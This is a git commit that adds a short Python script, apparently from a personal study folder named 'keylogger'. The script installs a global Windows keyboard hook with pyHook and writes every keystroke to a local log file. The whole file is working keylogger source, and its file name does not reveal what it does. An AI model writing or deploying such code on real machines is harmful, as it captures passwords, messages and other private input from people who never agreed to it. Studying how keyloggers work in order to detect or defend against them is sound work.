44f239d28ec851334b3683bc84dcb67f1d686c4e
Helton Xavier Hernandez <52825808+heltonx@users.noreply.github.com>
2023-12-05 15:30:02 -0300

    Add files via upload

---
+++ bald-forsado-provisorio.py
@@ -0,0 +1,16 @@
+import pyHook, pythoncom, sys, logging
+
+file_log = 'C:\\projeto-arquivao\\triplice-estudo-e-concursos\\programacao-tecnologia\\python\\keylogger\\log.txt'
+
+def OnKeyboardEvent(event):
+	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+	chr(event.Ascii)
+	logging.log(10,chr(event.Ascii))	
+	return True
+
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
+pythoncom.PumpMessages()
+
+	
